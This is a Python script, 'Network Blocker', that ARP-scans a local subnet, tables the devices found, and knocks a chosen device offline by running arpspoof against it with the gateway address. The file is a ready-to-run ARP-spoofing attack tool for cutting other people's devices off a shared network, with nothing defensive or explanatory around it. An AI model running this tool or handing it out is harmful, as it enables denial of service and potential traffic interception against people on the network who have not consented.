import os
import sys

from typing import List, Tuple

import socket

try:
    from scapy.all import ARP, Ether, srp
    from tabulate import tabulate
except ImportError:
    print("Required dependencies not found.")
    print("Please install the required packages with the following command:")
    print("pip install scapy tabulate")
    sys.exit(1)


def scan_network(ip_range: str) -> List[Tuple[str, str]]:
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(arp_req, timeout=3, verbose=False)

    device_list = []

    for _, rcv in answered:
        ip = rcv[ARP].psrc
        mac = rcv[Ether].src
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = "Unknown"
        device_list.append((ip, mac, hostname))

    return device_list


def generate_devices_table(device_list: List[Tuple[str, str]]):
    headers = ["Index", "IP Address", "MAC Address", "Hostname"]
    table = [
        (index, ip, mac, hostname)
        for index, (ip, mac, hostname) in enumerate(device_list)
    ]

    return tabulate(table, headers=headers, tablefmt="grid")


def block_device(
    device: Tuple[str, str, str],
    gateway_ip: str,
    iface: str,
):
    # os.system(
    #     "echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward"
    # )  # disable ip forwarding

    target_ip, target_mac, hostname = device

    arpspoof_cmd = f"sudo arpspoof -i {iface} -t {target_ip} {gateway_ip}"
    os.system(arpspoof_cmd)


def print_menu():
    os.system("clear")  # clear the terminal

    print("\n#                Welcome to Network Blocker              #")
    print("         Script to block a device on your network          \n")
    print("                                       Developed by OzKuro \n")


if __name__ == "__main__":
    print_menu()

    if os.geteuid() != 0:
        print("Please run this script with root privileges.")
        sys.exit(1)

    print("Scanning network...")

    iface = os.popen(
        "ip -o -4 route show to default | awk '{print $5}'"
    ).read()  # get the interface name

    iface = iface.strip("\n")  # remove the trailing newline

    ip_range = "192.168.1.0/24"  # the ip range to scan

    gateway_ip = os.popen(
        "ip -o -4 route show to default | awk '{print $3}'"
    ).read()  # get the gateway ip

    gateway_ip = gateway_ip.strip("\n")  # remove the trailing newline

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IPAddr = s.getsockname()[0]
    s.close()

    device_list = scan_network(ip_range)

    if not device_list:
        print("No devices found.")
        sys.exit(1)

    # for device in device_list:
    #     if device[0] == gateway_ip:
    #         print("Removing gateway from the list...")
    #         device_list.remove(device)

    #     if device[0] == IPAddr:
    #         device_list.remove(device)

    devices_table = generate_devices_table(device_list)

    print_menu()

    print(devices_table, "\n")

    print("           Your IP Address is: ", IPAddr, "\n\n\n")

    while True:
        try:
            choice = int(input("Enter the index of the device or -1 to exit: "))

            if choice == -1:
                print("\nExiting...")
                break
            elif 0 <= choice < len(device_list):
                if device_list[choice][0] == gateway_ip:
                    print_menu()

                    print(devices_table, "\n")

                    print("           Your IP Address is: ", IPAddr, "\n")

                    print("           You cannot block your gateway.\n")
                    continue

                print("\nselected device: ", choice)
                selected_device = device_list[choice]
                print(
                    "Blocking",
                    selected_device[0],
                )
                print("Press Ctrl+C and wait to stop blocking the device.\n")

                block_device(selected_device, gateway_ip, iface)

                print_menu()

                print(devices_table, "\n")

                print("           Your IP Address is: ", IPAddr, "\n")
            else:
                print_menu()

                print(devices_table, "\n")

                print("           Your IP Address is: ", IPAddr, "\n")

                print("           Invalid choice. Please try again.\n")
        except ValueError:
            print_menu()

            print(devices_table, "\n")

            print("           Your IP Address is: ", IPAddr, "\n")

            print("          Invalid input. Please enter a number.    \n")
